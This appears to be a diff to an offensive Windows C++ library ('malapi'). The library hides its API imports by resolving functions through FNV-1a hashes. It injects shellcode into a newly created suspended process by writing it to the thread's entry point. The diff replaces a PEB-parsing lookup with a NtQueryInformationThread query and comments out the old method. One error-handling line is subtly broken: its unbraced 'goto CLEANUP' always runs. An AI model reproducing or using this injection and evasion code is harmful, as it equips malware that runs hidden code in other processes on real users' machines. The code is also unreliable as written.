@@ -198,7 +198,7 @@ namespace malapi
 		constexpr ULONG hash_virtualallocexnuma = HashStringFowlerNollVoVariant1a("VirtualAllocExNuma");
 		constexpr ULONG hash_virtualprotectex = HashStringFowlerNollVoVariant1a("VirtualProtectEx");
 		constexpr ULONG hash_writeprocessmemory = HashStringFowlerNollVoVariant1a("WriteProcessMemory");
-		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");
+		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
 		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
 
 		kernel32 = GetModuleHandleC(hash_kernel32);
@@ -1000,6 +1000,8 @@ namespace malapi
 	// CreateSuspendedProcess
 	// Return ThreadHandle
 	//
+	// Based on ired.team & https://bohops.com/2023/06/09/no-alloc-no-problem-leveraging-program-entry-points-for-process-injection/
+	//
 	HANDLE EntryPointHandle(LPSTR file_path, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
 	{
 		STARTUPINFOA si = {};
@@ -1024,6 +1026,7 @@ namespace malapi
 		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");
 
 		constexpr DWORD hash_ntqueryinformationprocess = HashStringFowlerNollVoVariant1a("NtQueryInformationProcess");
+		constexpr DWORD hash_ntqueryinformationthread = HashStringFowlerNollVoVariant1a("NtQueryInformationThread");
 		constexpr DWORD hash_ntreadvirtualmemory = HashStringFowlerNollVoVariant1a("NtReadVirtualMemory");
 
 		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
@@ -1036,6 +1039,7 @@ namespace malapi
 		typeGetLastError GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
 
 		typeNtQueryInformationProcess NtQueryInformationProcessC = (typeNtQueryInformationProcess)GetProcAddressC(ntdll, hash_ntqueryinformationprocess);
+		typeNtQueryInformationThread NtQueryInformationThreadC = (typeNtQueryInformationThread)GetProcAddressC(ntdll, hash_ntqueryinformationthread);
 		typeNtReadVirtualMemory NtReadVirtualMemoryC = (typeNtReadVirtualMemory)GetProcAddressC(ntdll, hash_ntreadvirtualmemory);
 
 #pragma endregion
@@ -1055,8 +1059,15 @@ namespace malapi
 		LOG_INFO("Process Handle: %p", pi.hProcess);
 		LOG_INFO("Thread Handle: %p", pi.hThread);
 
-		NtQueryInformationProcessC(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &return_length);
+		if (!NT_SUCCESS(NtQueryInformationThreadC(pi.hThread, (THREADINFOCLASS)9, &code_entry, sizeof(PVOID), &return_length)))
+		{
+			LOG_ERROR("Failed to Query Thread Information");
+			return INVALID_HANDLE_VALUE;
+		}
+		LOG_SUCCESS("Thread Address: 0x%016llX", code_entry);
 
+		/* // Old POC
+		NtQueryInformationProcessC(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &return_length);
 #ifdef _WIN64
 		peb_offset = (DWORD_PTR)pbi.PebBaseAddress + 0x10;
 		LOG_INFO("PEB: %016llX", pbi.PebBaseAddress);
@@ -1090,6 +1101,8 @@ namespace malapi
 		nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)headers_buffer + dos_header->e_lfanew);
 #endif
 		code_entry = (LPVOID)(nt_headers->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)image_base);
+
+*/
 
 		if (!WriteProcessMemoryC(pi.hProcess, code_entry, shellcode, shellcode_size, NULL)) LOG_ERROR("Failed to write shellcode to entry point"); goto CLEANUP;
 		LOG_SUCCESS("Shellcode written to: %016llX", code_entry);
